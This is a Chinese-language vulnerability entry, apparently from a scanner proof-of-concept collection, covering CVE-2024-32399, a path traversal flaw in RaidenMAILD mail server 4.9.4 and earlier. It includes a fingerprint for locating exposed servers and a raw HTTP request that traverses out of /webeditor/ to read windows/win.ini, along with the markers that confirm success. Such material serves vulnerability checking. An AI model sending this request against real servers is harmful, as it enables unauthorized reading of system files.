﻿# RaidenMAILD 邮件服务器 路径遍历漏洞

> 更新时间：2024-04-30

> 漏洞编号：CVE-2024-32399

> 漏洞说明：RaidenMAILD是一款稳定、安全、高性能的邮件服务器软件，适用于中小型企业、机构以及个人用户搭建自己的邮件系统。该产品 Raden MAILD Mail Server v.4.9.4及以前版本中存在目录遍历漏洞，允许远程攻击者通过/webeditor/组件获取敏感信息。

> 漏洞特征：body="RaidenMAILD"

> 验证脚本：HTTP

```
GET /webeditor/../../../windows/win.ini HTTP/1.1
Cache-Control: max-age=0
Connection: close
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：

> 验证文件来源：RaidenMAILD 邮件服务器 路径遍历漏洞.poc

